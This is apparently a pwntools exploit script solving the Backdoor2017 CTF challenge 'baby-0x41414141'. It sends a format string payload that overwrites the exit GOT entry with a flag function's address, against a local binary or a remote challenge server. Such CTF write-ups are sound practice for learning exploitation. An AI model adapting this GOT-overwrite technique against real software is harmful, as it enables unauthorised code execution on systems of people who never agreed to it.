#!/usr/bin/env python2

from pwn import *
from libformatstr import FormatStr

HOST = '163.172.176.29'
PORT = 9035

local = True

if local:
    conn = process("./32_new")
else:
    conn = remote(HOST, PORT)

elf = ELF("./32_new")

context.log_level = 'debug'
gdb.attach(conn,
           """
           c
           """
           )

""" Here we go.
"""
log.info("Backdoor2017 baby-0x41414141 : FSB write")

# Sync for debugging
raw_input("[*] Press enter key to start...")

print conn.recvline()

""" FSB exploit
"""

EXIT_GOT = elf.got['exit']

FLAG = 0x0804870b
FLAG_LOW  = FLAG & 0xffff
FLAG_HIGH = (FLAG & 0xffff0000) >> 16

ex  = p32(EXIT_GOT)
ex += p32(EXIT_GOT+2)
#ex += '%10$lln' # clears the already existing exit address
ex += '%{}x%11$hn'.format(FLAG_HIGH-78)
ex += '%{}x%10$hn'.format(FLAG_LOW-FLAG_HIGH)

conn.sendline(ex)
print conn.recv()

# End
conn.interactive()
